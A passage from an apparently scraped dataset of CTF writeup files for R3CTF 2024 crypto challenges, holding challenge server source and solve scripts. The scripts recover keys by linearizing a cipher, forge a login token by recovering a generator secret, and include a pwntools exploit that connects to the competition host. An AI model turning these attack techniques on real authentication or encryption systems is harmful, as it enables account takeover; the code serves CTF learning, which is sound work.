range(0, len(data['e']), 32)]\n    A, B, C = ABC_linearization(seed)\n    eqs = []\n    for e, ct in zip(es, cts):\n        e_vec = spr.split(e)\n        ct_vec = spr.split(ct)\n        rh = sum(ct_vec)\n        lh = 0\n        cc = B * vector(GF(2), e_vec) + C\n        cc = [int(i) for i in cc]\n        for i in range(128):\n            if cc[i] == 1:\n                lh += (1 - ys[i])\n            else:\n                lh += ys[i]\n        eqs.append(lh - rh)\n    seq = Sequence(eqs)\n    M, b = seq.coefficient_matrix()\n    ker = M.right_kernel().basis()\n    if len(ker) == 0:\n        print(\"No solution\")\n        print(\"Check the equations\")\n    elif len(ker) > 1:\n        print(f\"Multiple solutions {len(ker) = }\")\n    sol = ker[0]\n    # print(f\"{sol = }\")\n    return A, B, C, sol\n\nsolve_pow(io)\nA1, B1, C1, sol1 = recover_ct()\nA2, B2, C2, sol2 = recover_ct()\nA3, B3, C3, sol3 = recover_ct()\n\n\nbr = BooleanPolynomialRing(256, 'x')\nxs = br.gens()\nassert sol1[128] == 1 and sol2[128] == 1 and sol3[128] == 1\nS1 = vector(br, [int(i) for i in sol1[:128]])\nS2 = vector(br, [int(i) for i in sol2[:128]])\nS3 = vector(br, [int(i) for i in sol3[:128]])\n\nms = list(xs[:128])\nks = list(xs[128:])\neqs = []\n# A1 * x + B1 * m = S1\n# A2 * x + B2 * m = S2\n# A3 * x + B3 * m = S3\n\npolys = A1 * vector(ms) + B1 * vector(ks) + S1\neqs.extend(list(polys))\npolys = A2 * vector(ms) + B2 * vector(ks) + S2\neqs.extend(list(polys))\npolys = A3 * vector(ms) + B3 * vector(ks) + S3\neqs.extend(list(polys))\n\nseq = Sequence(eqs)\nM, b = seq.coefficient_matrix()\nker = M.right_kernel().basis()\nif len(ker) == 0:\n    print(\"No solution\")\n    print(\"Check the equations\")\nassert len(ker) == 1, f\"{len(ker) = } solutions found, try more samples\"\nlog.info(f\"{len(ker) = }\")\nsol = ker[0]\n\nmsg_bits = [int(i) for i in sol[:128]]\nkey_bits = [int(i) for i in sol[128:256]]\nassert sol[256] == 1\nrecovered_msg = spr.unite(msg_bits)\nrecoverd_key = spr.unite(key_bits)\n\nio.sendlineafter(b'|  >', b's')\nio.sendlineafter(b'|  key>', recoverd_key.hex().encode())\nio.sendlineafter(b'|  sec>', recovered_msg.hex().encode())\nlog.info(io.recvline().decode().strip())\nlog.info(io.recvline().decode().strip())", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\Sparrow\\solve\\linearizaion.py", "category": "crypto", "solution_code": "from sage.all import GF, matrix, vector\nfrom utils import Sparrow\nimport os\n\n\nsec = os.urandom(16)\nspr = Sparrow(key=os.urandom(16))\nSEED= os.urandom(16)\n\ndef encrypt(msg, seed=SEED):\n    spr.st(seed)\n    ct = spr.encrypt(msg)\n    spr.ed()\n    return ct\n\ndef encrypt0(key, seed=SEED):\n    spr.st(seed)\n    spr.key = key\n    msg = b\"\\x00\" * 16\n    ct = spr.encrypt(msg)\n    spr.ed()\n    return ct\n\ndef encrypt1(key, msg, seed=SEED):\n    spr.st(seed)\n    spr.key = key\n    ct = spr.encrypt(msg)\n    spr.ed()\n    return ct\n\ndef getA(seed):\n    base = b\"\\x00\" * 16\n    c0 = encrypt(base, seed)\n    vecs = []\n    for i in range(128):\n        p = [0] * 128\n        p[i] = 1\n        p = spr.unite(p)\n        row = spr.xor(encrypt(p, seed),c0)\n        vecs.append(spr.split(row))\n    A = matrix(GF(2), vecs).T\n    return A\n\ndef getBC(seed):\n    base_key0 = b\"\\x00\" * 16\n    c00 = encrypt0(base_key0, seed)\n\n    vecs = []\n    for i in range(128):\n        k = [0] * 128\n        k[i] = 1\n        k = spr.unite(k)\n        row = spr.xor(encrypt0(k, seed),c00)\n        vecs.append(spr.split(row))\n\n    B = matrix(GF(2), vecs).T\n    C = vector(GF(2), spr.split(c00))\n    return B, C\n\ndef ABC_linearization(seed):\n    A = getA(seed)\n    B, C = getBC(seed)\n    return A, B, C\n\ndef test_impl():\n    key = os.urandom(16)\n    msg = os.urandom(16)\n    seed = os.urandom(16)\n    A, B, C = ABC_linearization(seed)\n    k_vec = vector(GF(2), spr.split(key))\n    m_vec = vector(GF(2), spr.split(msg))\n\n    ct1 = encrypt1(key, msg, seed)\n    ct2 = spr.unite(A*m_vec + B*k_vec + C)\n    print(f\"key = {key.hex()}\")\n    print(f\"msg = {msg.hex()}\")\n    print(f\"ct1 = {ct1.hex()}\")\n    print(f\"ct2 = {ct2.hex()}\")\n    assert ct1 == ct2\n    print(\"Test passed\")\n    \nif __name__ == \"__main__\":\n    test_impl()\n\n# n = 128\n# A = matrix(GF(2), n, n)\n# B = matrix(GF(2), n, n)\n# base = b\"\\x00\" * 16\n# c0 = encrypt(base)\n# vecs = []\n\n# for i in range(128):\n#     p = [0] * 128\n#     p[i] = 1\n#     p = spr.unite(p)\n#     row = spr.xor(encrypt(p),c0)\n#     vecs.append(spr.split(row))\n\n# A = matrix(GF(2), vecs).T\n# b = vector(GF(2), spr.split(c0))\n\n# p = os.urandom(16)\n# p_vec = vector(GF(2), spr.split(p))\n# c = spr.unite([int(bit) for bit in A * p_vec + b])\n# s = encrypt(p)\n\n# print(f\"p = {p.hex()}\")\n# print(f\"c = {c.hex()}\")\n# print(f\"s = {s.hex()}\")\n\n# base_key0 = b\"\\x00\" * 16\n# c00 = encrypt0(base_key0)\n# print(f\"c00 = {c00.hex()}\")\n\n# vecs = []\n# for i in range(128):\n#     k = [0] * 128\n#     k[i] = 1\n#     k = spr.unite(k)\n#     row = spr.xor(encrypt0(k),c00)\n#     vecs.append(spr.split(row))\n\n# B = matrix(GF(2), vecs).T\n# C = vector(GF(2), spr.split(c00))\n\n# key = os.urandom(16)\n# key_vec = vector(GF(2), spr.split(key))\n# c = spr.unite([int(bit) for bit in B * key_vec + C])\n# s = encrypt0(key)\n# print(f\"p = {key.hex()}\")\n# print(f\"c = {c.hex()}\")\n# print(f\"s = {s.hex()}\")\n\n# key = os.urandom(16)\n# msg = os.urandom(16)\n# k_vec = vector(GF(2), spr.split(key))\n# m_vec = vector(GF(2), spr.split(msg))\n\n# ct1 = encrypt1(key, msg)\n# ct2 = spr.unite(A*m_vec + B*k_vec + C)\n# print(f\"key = {key.hex()}\")\n# print(f\"msg = {msg.hex()}\")\n# print(f\"ct1 = {ct1.hex()}\")\n# print(f\"ct2 = {ct2.hex()}\")\n\n", "name": "linearizaion"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\Sparrow\\solve\\solver.py", "category": "crypto", "solution_code": "from linearizaion import ABC_linearization\nfrom sage.all import PolynomialRing, GF, matrix, vector, QQ, BooleanPolynomialRing, ZZ, Sequence, solve\nfrom utils import Sparrow, fault, noise\nimport os\n\nsec = os.urandom(16)\nspr = Sparrow(key=os.urandom(16))\n\ndef oracle(t: int) -> dict:\n    s, es, cs = os.urandom(16), str(), str()\n    spr.st(s)\n    for _ in range(t):\n        e = os.urandom(16)\n        c = noise(spr, fault(spr, e).encrypt(sec))\n        es += e.hex()\n        cs += c.hex()\n    spr.ed()\n    return {\"s\": s.hex(), \"e\": es, \"c\": cs}\n\ndef recover_ct(t = 256):\n    ys = PolynomialRing(ZZ, 128, 'y').gens()\n    data = oracle(t)\n    seed = bytes.fromhex(data['s'])\n    cts = [bytes.fromhex(data['c'][i:i+32]) for i in range(0, len(data['c']), 32)]\n    es = [bytes.fromhex(data['e'][i:i+32]) for i in range(0, len(data['e']), 32)]\n    A, B, C = ABC_linearization(seed)\n    eqs = []\n    for e, ct in zip(es, cts):\n        e_vec = spr.split(e)\n        ct_vec = spr.split(ct)\n        rh = sum(ct_vec)\n        lh = 0\n        cc = B * vector(GF(2), e_vec) + C\n        cc = [int(i) for i in cc]\n        for i in range(128):\n            if cc[i] == 1:\n                lh += (1 - ys[i])\n            else:\n                lh += ys[i]\n        eqs.append(lh - rh)\n    seq = Sequence(eqs)\n    M, b = seq.coefficient_matrix()\n    ker = M.right_kernel().basis()\n    if len(ker) == 0:\n        print(\"No solution\")\n        print(\"Check the equations\")\n    elif len(ker) > 1:\n        print(f\"Multiple solutions {len(ker) = }\")\n    sol = ker[0]\n    print(f\"{sol = }\")\n    return A, B, C, sol\n\nA1, B1, C1, sol1 = recover_ct()\nA2, B2, C2, sol2 = recover_ct()\nA3, B3, C3, sol3 = recover_ct()\n\n\nbr = BooleanPolynomialRing(256, 'x')\nxs = br.gens()\nassert sol1[128] == 1 and sol2[128] == 1 and sol3[128] == 1\nS1 = vector(br, [int(i) for i in sol1[:128]])\nS2 = vector(br, [int(i) for i in sol2[:128]])\nS3 = vector(br, [int(i) for i in sol3[:128]])\n\nms = list(xs[:128])\nks = list(xs[128:])\neqs = []\n# A1 * x + B1 * m = S1\n# A2 * x + B2 * m = S2\npolys = A1 * vector(ms) + B1 * vector(ks) + S1\neqs.extend(list(polys))\npolys = A2 * vector(ms) + B2 * vector(ks) + S2\neqs.extend(list(polys))\npolys = A3 * vector(ms) + B3 * vector(ks) + S3\neqs.extend(list(polys))\n\nseq = Sequence(eqs)\nM, b = seq.coefficient_matrix()\nker = M.right_kernel().basis()\nif len(ker) == 0:\n    print(\"No solution\")\n    print(\"Check the equations\")\nassert len(ker) == 1, f\"{len(ker) = } solutions found, try more samples\"\n# print(f\"Solution numbers: {len(ker) = }\")\n\nsol = ker[0]\nmsg_bits = [int(i) for i in sol[:128]]\nkey_bits = [int(i) for i in sol[128:256]]\nassert sol[256] == 1\nrecovered_msg = spr.unite(msg_bits)\nrecoverd_key = spr.unite(key_bits)\nprint(f\"check msg: {recovered_msg == sec}\")\nprint(f\"check key: {recoverd_key == spr.key}\")", "name": "solver"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\r1-2system\\challenge\\server.py", "category": "crypto", "solution_code": "from user import *\n# from secret import FLAG1\nimport os\nFLAG1 = b\"flag{test_flag1}\" + os.urandom(16).hex().encode()\n\nLOGIN_MENU = b\"\"\"[+] Nice day!\n[1]. Log In [Password]\n[2]. Log In [Token]\n[3]. Sign Up\n[4]. Exit\n\"\"\"\n\nSYSTEM_MENU = b\"\"\" \n[1]. Reset Password\n[2]. Exchange keys with sb.\n[3]. Get news on public channels\n[4]. Get your private key & public key\n[5]. Quit\n\"\"\"\n\nPublicChannels = b\"\"\nlogin_tag = False\nUSER = Users()\n\nAliceUsername = b'AliceIsSomeBody'\nBobUsername   = b'BobCanBeAnyBody'\n\nUSER.register(AliceUsername,os.urandom(166)) \n\ndef LoginSystem(USER): \n    global login_tag \n    option = int(input(b\"Now input your option: \".decode()))\n    if option == 1:\n        username = bytes.fromhex(input(b\"Username[HEX]: \".decode()))\n        password = bytes.fromhex(input(b\"Password[HEX]: \".decode()))\n        login_tag,msg = USER.login_by_password(username,password)\n        print(msg.decode())\n        if login_tag: \n            return username \n\n    elif option == 2:\n        username = bytes.fromhex(input(b\"Username[HEX]: \".decode()))\n        token = bytes.fromhex(input(b\"Token[HEX]: \".decode()))\n        login_tag,msg = USER.login_by_token(username,token)\n        print(msg.decode())\n        if login_tag:\n            return username \n\n    elif option == 3:\n        username = bytes.fromhex(input(b\"Username[HEX]: \".decode()))\n        if username == AliceUsername or username == AliceUsername:\n            print(b\"You can't!\")\n            return\n        password = bytes.fromhex(input(b\"Password[HEX]: \".decode()))\n        register_tag,msg = USER.register(username,password) \n        if register_tag:\n            print(f\"Register successfully, {username.decode()} 's token is {msg.hex()}.\".encode().decode())\n        else:\n            print(msg.decode())\n\n    else:\n        exit()\n\ndef R1System(USERNAME): \n    global login_tag,PublicChannels\n    option = int(input((b\"Hello \"+ USERNAME + b\",do you need any services? \").decode()))\n    if option == 1: \n        new_password = bytes.fromhex(input(b\"New Password[HEX]: \".decode()))\n        tag,msg = USER.reset_password(USERNAME,new_password)\n        print(msg.decode())\n    elif option == 2:\n        ToUsername = bytes.fromhex(input(b\"ToUsername[HEX]:\".decode()))\n\n        if ToUsername not in USER.usernames:\n            print(b\"ERROR\".decode())\n            return False\n    \n        PublicChannels += transfer_A2B(USER,USERNAME,ToUsername,b\" My Pubclic key is: \" + USER.getsb_public_key(USERNAME).hex().encode())\n        PublicChannels += transfer_A2B(USER,ToUsername,USERNAME,b\" My Pubclic key is: \" + USER.getsb_public_key(ToUsername).hex().encode())\n\n        ToPublickey = b2p(USER.getsb_public_key(ToUsername))\n        change_key = USER.ecdhs[USERNAME].exchange_key(ToPublickey)\n        print((b\"Exchanged Key is: \" + change_key.hex().encode() ) .decode())\n\n    elif option == 3:\n        print(PublicChannels.decode())\n    \n    elif option == 4:\n        print((b\"Your private key is:\" + USER.view_private_key(USERNAME).hex().encode()) .decode())\n        print((f\"Your public key is:\".encode() + USER.getsb_public_key(USERNAME).hex().encode()).decode())\n    \n    elif option == 5:\n        login_tag = False\n\ndef Alice_transfer_flag_to_Bob(AliceUsername,BobUsername):\n    global PublicChannels\n    PublicChannels += transfer_A2B(USER,AliceUsername,BobUsername,b\" Halo bob, I will give your my flag after we exchange keys.\")\n    PublicChannels += transfer_A2B(USER,BobUsername,AliceUsername,b\" OK, I'm ready.\")\n    PublicChannels += transfer_A2B(USER,AliceUsername,BobUsername,b\" My Pubclic key is: \" + USER.getsb_public_key(AliceUsername).hex().encode())\n    PublicChannels += transfer_A2B(USER,BobUsername,AliceUsername,b\" My Pubclic key is: \" + USER.getsb_public_key(BobUsername).hex().encode())\n    PublicChannels += transfer_A2B(USER,AliceUsername,BobUsername,b\" Now its my encrypted flag:\")\n    PublicChannels += transfer_A2B(USER,AliceUsername,BobUsername,   FLAG1 ,enc=True)\n    PublicChannels += transfer_A2B(USER,BobUsername,AliceUsername,b\" Wow! I know your flag now! \")\n\ntransfer_flag = False\nwhile 1:\n    if not login_tag:\n        print(LOGIN_MENU.decode())\n        USERNAME = LoginSystem(USER) \n    else:\n        if not transfer_flag:\n            USER.register(BobUsername,os.urandom(166))\n            Alice_transfer_flag_to_Bob(AliceUsername,BobUsername)\n            transfer_flag = True\n        print(SYSTEM_MENU.decode())\n        R1System(USERNAME)", "name": "server"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\r1-2system\\challenge\\user.py", "category": "crypto", "solution_code": "from utils import *\nimport os\n\nMOD  = 0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000283\nSEED = b2i(os.urandom(128))\n\nclass Users:\n    def __init__(self):\n        self.usernames = set()\n        self.passwords = {}\n        self.tokens = {}\n\n        self.ecdhs = {}\n        self.exchange_keys = {}\n\n        self.RNG = RandomNG(MOD,SEED)\n        self.x = randint(1,MOD)\n\n    def generate_token(self,username):\n        s = self.RNG.next()\n        u = b2i(username)\n        return i2b(int((self.x * pow(s + u,-1,MOD)) % MOD),128)\n\n    def register(self,username,password):\n        if username in self.usernames:\n            return False, b\"Username already exists!\"\n        \n        if len(self.usernames) > 11: \n            return False, b\"Too many accounts!\"\n\n        self.usernames.add(username)\n        self.passwords[username] = password\n\n        token = self.generate_token(username)\n        self.tokens[username] = token\n        ecdh = ECDH()\n\n        self.ecdhs[username] = ecdh \n        \n        return True,token\n\n    def login_by_password(self,username,password):\n        if username not in self.usernames:\n            return False, b\"Username does not exist!\"\n\n        check_password = self.passwords[username]\n        if check_password == password:\n            return True, b\"Login successfully!\"\n        else:\n            return False, b\"Password ERROR!\"\n\n    def login_by_token(self,username,token):\n        if username not in self.usernames:\n            return False, b\"Username does not exist!\"\n\n        check_token = self.tokens[username]\n        if check_token == token:\n            return True, b\"Login successfully!\"\n        else:\n            return False, b\"Token ERROR!\"\n\n    def reset_password(self,username, new_password):\n        if username not in self.usernames:\n            return False, b\"Username does not exist!\"\n        self.passwords[username] = new_password\n        return True, b\"Reset password successfully!\" \n\n    def view_private_key(self,username):\n        return i2b(self.ecdhs[username].private_key,32)\n\n    def getsb_public_key(self,username):\n        return p2b(self.ecdhs[username].public_key)\n\n    def send_enc_msg_from_A2B(self,A,B,msg):\n        if A < B:\n            if A+B not in self.exchange_keys:\n                ABkey = self.ecdhs[A].exchange_key(self.ecdhs[B].public_key)\n                self.exchange_keys[A+B] = ABkey\n            else:\n                ABkey = self.exchange_keys[A+B]\n        else:\n            if B+A not in self.exchange_keys:\n                ABkey = self.ecdhs[A].exchange_key(self.ecdhs[B].public_key)\n                self.exchange_keys[B+A] = ABkey\n            else:\n                ABkey = self.exchange_keys[B+A]\n\n        return enc(msg,ABkey)\n", "name": "user"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\r1-2system\\challenge\\utils.py", "category": "crypto", "solution_code": "from random import randint\nfrom hashlib import md5\nfrom Crypto.Cipher import AES\n\ndef pad(msg):\n    return msg + bytes([i for i in range(16 - int(len(msg) % 16))])\n\ndef i2b(i,l):\n    return int.to_bytes(i,length=l,byteorder='big')\n\ndef b2i(b):\n    return int.from_bytes(b,byteorder='big')\n\ndef p2b(P):\n    return i2b(P[0],32) + i2b(P[1],32)\n\ndef b2p(m):\n    return (b2i(m[:32]),b2i(m[32:]))\n\ndef enc(msg,key):\n    aes = AES.new(key,AES.MODE_ECB)\n    return aes.encrypt(pad(msg))\n\nclass RandomNG:\n    def __init__(self, mod, seed):\n        self.coeffs = [randint(1,mod) for _ in range(8)]\n        self.mod = mod\n        self.state = seed \n\n    def next(self):\n        old_state = int(self.state)\n        self.state = sum(coeff * self.state**i for i,coeff in enumerate(self.coeffs)) % self.mod\n        return old_state\n\nclass Curve: \n    def __init__(self):\n        # Nist p-256\n        self.p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff\n        self.a = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc\n        self.b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b\n        self.G = (0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296, \n                  0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5)\n        self.n = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551\n\n    def add(self,P, Q):\n        if (P == (0, 0)):\n            return Q\n        elif (Q == (0, 0)):\n            return P\n        else: \n            x1, y1 = P\n            x2, y2 = Q\n            if ((x1 == x2) & (y1 == -y2)):\n                return ((0, 0))\n            else:\n                if (P != Q):\n                    l = (y2 - y1) * pow(x2 - x1, -1, self.p)\n                else:\n                    l = (3 * (x1**2) + self.a) * pow(2 * y1, -1, self.p)\n            x3 = ((l**2) - x1 - x2) % self.p\n            y3 = (l * (x1 - x3) - y1) % self.p\n            return x3, y3\n\n    def mul(self, n , P):\n        Q = P\n        R = (0, 0)\n        while (n > 0):\n            if (n % 2 == 1):\n                R = self.add(R, Q)\n            Q = self.add(Q, Q)\n            n = n // 2\n        return R\n\nclass ECDH:\n    def __init__(self):\n        self.curve = Curve()\n        self.private_key = randint(1,self.curve.n)\n        self.public_key  = self.curve.mul(self.private_key, self.curve.G)\n\n    def exchange_key(self,others_publickey):\n        return md5(str(self.curve.mul(self.private_key,others_publickey)).encode()).digest()\n\ndef transfer_A2B(USER,A,B,msg,enc=False):\n    if enc == False:\n        return b'[' + A + b\"] to [\" + B + b\"]:\" + msg+b'\\n'\n    else:\n        return b'[' + A + b\"] to [\" + B + b\"]: \" + USER.send_enc_msg_from_A2B(A,B,msg).hex().encode()+b'\\n'\n", "name": "utils"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\r1-2system\\solve\\exp.py", "category": "crypto", "solution_code": "from pwn import remote, context, log, process\nimport os\nfrom recover_x import recover_sk\nfrom Crypto.Util.number import long_to_bytes, bytes_to_long\nfrom sage.all import GF, PolynomialRing\nfrom utils import ECDH, b2p, p2b\nfrom Crypto.Cipher import AES\n\ndef pad(msg):\n    return msg + bytes([i for i in range(16 - int(len(msg) % 16))])\n\ndef enc(msg,key):\n    aes = AES.new(key,AES.MODE_ECB)\n    return aes.encrypt(pad(msg))\n\ndef dec(msg,key):\n    aes = AES.new(key,AES.MODE_ECB)\n    return aes.decrypt(msg)\n\ndef sing_up(io:remote, uname:bytes, pwd:bytes):\n    io.sendlineafter(b\"Now input your option: \", b'3')\n    io.sendlineafter(b\"Username[HEX]: \", uname.hex().encode())\n    io.sendlineafter(b\"Password[HEX]: \", pwd.hex().encode())\n    io.recvuntil(b\"token is \")\n    token = io.recvline().strip().decode()\n    return token  \n\ndef login_by_password(io:remote, uname:bytes, pwd:bytes):\n    io.sendlineafter(b\"Now input your option: \", b'1')\n    io.sendlineafter(b\"Username[HEX]: \", uname.hex().encode())\n    io.sendlineafter(b\"Password[HEX]: \", pwd.hex().encode())\n    respone = io.recvline().strip().decode()\n    if respone == \"Login successfully!\":\n        return True, uname\n    return False, uname\n\ndef login_by_token(io:remote, uname:bytes, token:bytes):\n    io.sendlineafter(b\"Now input your option: \", b'2')\n    io.sendlineafter(b\"Username[HEX]: \", uname.hex().encode())\n    io.sendlineafter(b\"Token[HEX]: \", token.hex().encode())\n    respone = io.recvline().strip().decode()\n    if respone == \"Login successfully!\":\n        return True, uname\n    return False, uname\n\ndef reset_password(io:remote, uname:bytes, new_pwd:bytes):\n    io.sendlineafter(b\",do you need any services? \", b'1')\n    io.sendlineafter(b\"Username[HEX]: \", uname.hex().encode())\n    io.sendlineafter(b\"New Password[HEX]: \", new_pwd.hex().encode())\n    respone = io.recvline().strip().decode()\n    return respone\n\ndef exit_login(io:remote):\n    io.sendlineafter(b\",do you need any services? \", b'5')\n\ndef get_PublicChannels(io:remote):\n    io.sendlineafter(b\"do you need any services? \", b'3')\n    # respone = io.recvuntil(b\" Wow! I know your flag now! \")\n    io.recvuntil(b\"[AliceIsSomeBody] to [BobCanBeAnyBody]: My Pubclic key is: \")\n    pka = bytes.fromhex(io.recvline().strip().decode())\n    io.recvuntil(b\"[BobCanBeAnyBody] to [AliceIsSomeBody]: My Pubclic key is: \")\n    pkb = bytes.fromhex(io.recvline().strip().decode())\n    io.recvuntil(b\"BobCanBeAnyBody]: Now its my encrypted flag:\\n[AliceIsSomeBody] to [BobCanBeAnyBody]: \")\n    encflag = bytes.fromhex(io.recvline().strip().decode())\n    return pka, pkb, encflag\n\ndef get_ecdh_keys(io:remote):\n    io.sendlineafter(b\",do you need any services? \", b'4')\n    io.recvuntil(b\"Your private key is:\")\n    sk = bytes.fromhex(io.recvline().strip().decode())\n    io.recvuntil(b\"Your public key is:\")\n    pk = bytes.fromhex(io.recvline().strip().decode())\n    return sk, pk\n\ndef gen_possible_tokens(sk, us, ys, uname, degree, mod):\n    # x = yi(ui + ki) % mod\n    R = GF(mod)\n    pr = PolynomialRing(R, names=('x',))\n    next_u = bytes_to_long(uname)\n    tokens = []\n    for x in sk:\n        ks = []\n        for ui, yi in zip(us, ys):\n            ki = x * pow(yi, -1, mod) - ui\n            ki = int(ki) % mod\n            ks.append(ki)\n        points = [(ks[i], ks[i+1]) for i in range(len(ks) - 1)]\n        poly = pr.lagrange_polynomial(points)\n        if poly.degree() == degree:\n            next_k = poly(ks[-1])\n            token_num = int((x * pow(next_k + next_u, -1, mod)) % mod)\n            tokens.append(long_to_bytes(token_num).hex())\n    return tokens\n        \n\nlocal = False\n# ctf2024-entry.r3kapig.com:30517\nio = process(['python3', 'server.py']) if local else remote('ctf2024-entry.r3kapig.com', 30517)\n\n\n# context.log_level = 'debug'\n\n# recover sk\nus = []\ntokens = []\npwds = []\nunames = []\nN = 10\n\nfor i in range(N):\n    uname = b'tl2cents' + str(i).encode()\n    pwd = b'password_' + os.urandom(8).hex().encode()\n    token = sing_up(io, uname, pwd)\n    pwds.append(pwd)\n    unames.append(uname)\n    # log.info(f\"{uname}'s token: {token}\")\n    tokens.append(int(token.strip(\".\"), 16))\n    us.append(bytes_to_long(uname))\n    \ndegree = 7\nMOD  = 0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000283\nsk = recover_sk(us, tokens, degree, MOD)\nBobUsername   = b'BobCanBeAnyBody'\nbob_tokens = gen_possible_tokens(sk, us, tokens, BobUsername, degree, MOD)\nlog.info(f\"Bob's possible tokens number : {len(bob_tokens)}\")\n\nis_login, uname = login_by_password(io, unames[-1], pwds[-1])\nassert is_login, \"Login failed\"\npka, pkb, encflag = get_PublicChannels(io)\nlog.info(f\"pka: {pka.hex()}\")\nlog.info(f\"pkb: {pkb.hex()}\")\nlog.info(f\"encflag: {encflag.hex()}\")\n\nexit_login(io)\n# try login by token\nis_login = False\nfor token in bob_tokens:\n    is_login, uname = lo", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\r1-2system\\solve\\recover_x.py", "category": "crypto", "solution_code": "#!/usr/bin/env sage\n\nfrom sage.all import GF, PolynomialRing\nimport hashlib\nimport ecdsa\nimport random\nfrom utils import *\nimport os\n\n\ndef separator():\n    print(\"-\" * 150)\n\ndef gen_kij_poly(ys_inv, us, x, mod):\n    def k_ij_poly(i, j):\n        coeff1 = (ys_inv[i] - ys_inv[j]) % mod\n        coeff2 = (us[i] - us[j]) % mod\n        poly = coeff1*x - coeff2\n        return poly\n    return k_ij_poly\n\n\ndef dpoly(k_ij_poly, n, i, j):\n    if i == 0:\n        return (k_ij_poly(j+1, j+2))*(k_ij_poly(j+1, j+2)) - (k_ij_poly(j+2, j+3))*(k_ij_poly(j+0, j+1))\n    else:\n        left = dpoly(k_ij_poly, n, i-1, j)\n        for m in range(1, i+2):\n            left = left*(k_ij_poly(j+m, j+i+2))\n        right = dpoly(k_ij_poly, n, i-1, j+1)\n        for m in range(1, i+2):\n            right = right*(k_ij_poly(j, j+m))\n        return (left - right)\n\n\ndef print_dpoly(n, i, j):\n    if i == 0:\n        print('(k', j+1, j+2, '*k', j+1, j+2, '-k', j+2,\n              j+3, '*k', j+0, j+1, ')', sep='', end='')\n    else:\n        print('(', sep='', end='')\n        print_dpoly(n, i-1, j)\n        for m in range(1, i+2):\n            print('*k', j+m, j+i+2, sep='', end='')\n        print('-', sep='', end='')\n        print_dpoly(n, i-1, j+1)\n        for m in range(1, i+2):\n            print('*k', j, j+m, sep='', end='')\n        print(')', sep='', end='')\n        \ndef recover_sk(us, ys, degree, mod):\n    assert len(us) == len(ys)\n    assert len(us) >= degree + 3\n    Z = GF(mod)\n    R = PolynomialRing(Z, names=('x',))\n    (x,) = R._first_ngens(1)\n    \n    ys_inv = [int(pow(y, -1, mod)) for y in ys]\n    k_ij_poly = gen_kij_poly(ys_inv, us, x, mod)\n    poly_target = dpoly(k_ij_poly, degree - 1, degree - 1, 0)\n    d_guesses = poly_target.roots(multiplicities=False)\n    # separator()\n    # print(\"Roots of the polynomial :\")\n    # print(d_guesses)\n    # separator()\n    return d_guesses\n    \n    \ndef test_recover():\n    MOD = 0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000283\n    SEED = b2i(os.urandom(128))\n\n    N = 10\n    x = randint(1, MOD)\n    a = []\n    for i in range(N-2):\n        a.append(random.randint(1, MOD - 1))\n        \n    k = []\n    k.append(randint(1, MOD))\n    for i in range(N-1):\n        new_k = 0\n        for j in range(N-2):\n            new_k += a[j]*(k[i]**j) % MOD\n        k.append(new_k % MOD)\n\n    us = [randint(1, MOD) for _ in range(N)]\n    ys = []\n    ys_inv = []\n\n    for i in range(N):\n        y = (x * pow(k[i] + us[i], -1, MOD)) % MOD\n        ys.append(y)\n        ys_inv.append(int(pow(y, -1, MOD)))\n    \n    sk = recover_sk(us, ys, N-2, MOD)\n    print(f\"Check : {x in sk}\")\n\nif __name__ == \"__main__\":\n    test_recover()", "name": "recover_x"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\r0system\\challenge\\server.py", "category": "crypto", "solution_code": "from user import Users, transfer_A2B\n# from secret import \nFLAG0 = b\"R3CTF{this_is_a_fake_flag}\"\nimport os\n\nLOGIN_MENU = b\"\"\"[+] Nice day!\n[1]. Log In [Password]\n[2]. Log In [Token]\n[3]. Sign Up\n[4]. Exit\n\"\"\"\n\nSYSTEM_MENU = b\"\"\" \n[1]. Reset Password\n[2]. Exchange keys with sb.\n[3]. Get news on public channels\n[4]. Get your private key & public key\n[5]. Quit\n\"\"\"\n\nPublicChannels = b\"\"\nlogin_tag = False\nUSER = Users()\n\nAliceUsername = b'AliceIsSomeBody'\nBobUsername   = b'BobCanBeAnyBody'\n\nUSER.register(AliceUsername,os.urandom(166))\nUSER.register(BobUsername,os.urandom(166))\n\ndef LoginSystem(USER:Users): \n    global login_tag \n    option = int(input(b\"Now input your option: \".decode()))\n    if option == 1:\n        username = bytes.fromhex(input(b\"Username[HEX]: \".decode()))\n        password = bytes.fromhex(input(b\"Password[HEX]: \".decode()))\n        login_tag,msg = USER.login_by_password(username,password)\n        print(msg.decode())\n        if login_tag: \n            return username \n\n    elif option == 2:\n        username = bytes.fromhex(input(b\"Username[HEX]: \".decode()))\n        token = bytes.fromhex(input(b\"Token[HEX]: \".decode()))\n        login_tag,msg = USER.login_by_token(username,token)\n        print(msg.decode())\n        if login_tag:\n            return username \n\n    elif option == 3:\n        username = bytes.fromhex(input(b\"Username[HEX]: \".decode()))\n        password = bytes.fromhex(input(b\"Password[HEX]: \".decode()))\n        register_tag,msg = USER.register(username,password) \n        if register_tag:\n            print(f\"Register successfully, {username.decode()} 's 